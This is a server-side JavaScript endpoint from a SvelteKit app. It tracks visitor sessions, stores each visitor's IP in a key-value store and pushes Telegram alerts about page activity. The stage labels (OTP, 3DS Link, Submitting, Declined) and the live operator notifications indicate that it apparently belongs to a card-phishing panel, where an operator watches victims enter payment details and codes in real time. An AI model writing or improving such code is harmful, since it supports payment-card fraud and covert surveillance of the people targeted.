import { sendTelegram } from '$lib/telegram.js';

/**
 * Lightweight presence tracking.
 * Visitor pings { event: 'open'|'hidden'|'visible'|'unload'|'beforeunload'|'heartbeat', stage }.
 * We dedupe rapid duplicates and notify Telegram for important transitions only.
 *
 * State stored in KV at `presence:<id>` for ~30 min.
 *
 * @type {import('./$types').RequestHandler}
 */
export async function POST({ request, platform, getClientAddress }) {
  let body = {};
  try { body = await request.json(); } catch {}
  const sessionId = String(body.s || '').trim();
  const event = String(body.e || '').trim();
  const stage = String(body.stage || '').trim();
  if (!sessionId || !event) return new Response('ok');

  const store = platform?.env?.STORE;
  const key = `presence:${sessionId}`;
  const now = Date.now();

  let prev = null;
  if (store) {
    try { prev = await store.get(key, 'json'); } catch {}
  }

  // Compute next state
  const next = {
    last: event,
    stage,
    lastAt: now,
    ip: getClientAddress(),
    notifiedClose: prev?.notifiedClose ?? false,
    notifiedHidden: prev?.notifiedHidden ?? false,
    notifiedReturned: prev?.notifiedReturned ?? false,
    openedAt: prev?.openedAt ?? now
  };

  const STAGE_LABEL = {
    waiting: 'Waiting',
    otp: 'OTP',
    '3ds': '3DS Link',
    submitLoad: 'Submitting',
    done: 'Done',
    fail: 'Declined'
  };
  const stageTxt = STAGE_LABEL[stage] || stage || '?';
  const id6 = sessionId.slice(0, 8);

  // Decide if a Telegram notification is warranted
  let notifyMsg = null;

  if (event === 'unload' || event === 'beforeunload') {
    if (!next.notifiedClose) {
      notifyMsg = `🚪 *Visitor left page*\nSession: \`${id6}\`\nStage: ${stageTxt}`;
      next.notifiedClose = true;
    }
  } else if (event === 'hidden') {
    if (!next.notifiedHidden) {
      notifyMsg = `👁️‍🗨️ *Visitor switched tab / minimized*\nSession: \`${id6}\`\nStage: ${stageTxt}`;
      next.notifiedHidden = true;
      next.notifiedReturned = false;
    }
  } else if (event === 'visible') {
    if (next.notifiedHidden && !next.notifiedReturned) {
      notifyMsg = `👀 *Visitor returned to page*\nSession: \`${id6}\`\nStage: ${stageTxt}`;
      next.notifiedReturned = true;
      next.notifiedHidden = false;
    }
  } else if (event === 'open') {
    // Reset close flags on a fresh load (refresh detection — see notifyMsg below)
    if (prev?.notifiedClose) {
      notifyMsg = `🔄 *Visitor refreshed / reopened*\nSession: \`${id6}\`\nStage: ${stageTxt}`;
    }
    next.notifiedClose = false;
    next.notifiedHidden = false;
    next.notifiedReturned = false;
  }
  // 'heartbeat' → no notification

  if (store) {
    try { await store.put(key, JSON.stringify(next), { expirationTtl: 1800 }); } catch {}
  }

  if (notifyMsg) {
    const send = sendTelegram(notifyMsg);
    if (platform?.context?.waitUntil) platform.context.waitUntil(send);
    else send.catch(() => {});
  }

  return new Response('ok');
}
